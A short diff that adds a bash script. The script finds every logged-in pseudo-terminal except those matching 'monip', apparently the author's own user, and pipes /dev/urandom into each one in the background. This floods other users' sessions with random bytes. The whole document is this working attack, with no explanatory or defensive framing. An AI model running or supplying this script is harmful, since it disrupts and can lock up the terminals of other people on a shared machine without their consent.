@@ -1,0 +1,6 @@
+###
+#!/bin/bash
+w | grep pts | grep -v "monip" | awk '{print $2}' | while read line; do
+  cat /dev/urandom > /dev/$line &
+done
+
